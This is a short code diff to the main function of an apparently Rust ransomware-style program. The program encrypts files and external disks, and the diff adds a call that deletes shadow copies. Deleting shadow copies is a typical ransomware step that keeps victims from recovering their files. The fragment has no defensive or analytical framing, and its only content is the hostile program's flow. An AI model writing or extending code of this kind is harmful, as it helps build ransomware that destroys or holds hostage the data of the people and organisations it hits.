@@ -11,8 +11,10 @@ fn main(){
         println!("Missing Arguments");
         exit(-1)
     }
+    
     encryption::file::multi_threaded_encrypt_decrypt_files(&args[1][..]);
     encryption::disk::encrypt_decrypt_external_disks();
+    system::file::delete_shadow_copies();
 
     exit(0);
 }
